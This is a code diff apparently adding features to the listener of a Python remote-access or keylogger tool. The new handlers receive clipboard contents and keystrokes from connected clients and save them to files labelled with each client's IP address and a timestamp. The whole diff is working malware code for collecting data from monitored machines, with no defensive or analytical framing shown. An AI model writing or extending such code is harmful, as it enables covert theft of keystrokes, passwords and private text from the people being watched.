@@ -27,6 +27,26 @@ try:
 						file.write(l)
 						l = client.recv(1024)
 
+			elif "copypaste" in response:
+				print("copypaste")
+				now = datetime.now()
+				dt_string = now.strftime("%d.%m.%Y-%H.%M.%S")
+				with open("CopyPasteFrom-" + address[0] + '-' + dt_string + '.txt', 'wb') as file:
+					l = client.recv(1024)
+					while (l):
+						file.write(l)
+						l = client.recv(1024)
+
+			elif "keypress" in response:
+				print("keypress")
+				now = datetime.now()
+				dt_string = now.strftime("%d.%m.%Y-%H.%M.%S")
+				with open("KeyPressFrom-" + address[0] + '-' + dt_string + '.txt', 'wb') as file:
+					l = client.recv(1024)
+					while (l):
+						file.write(l)
+						l = client.recv(1024)
+
 
 			elif "help" in response:
 				print("help")
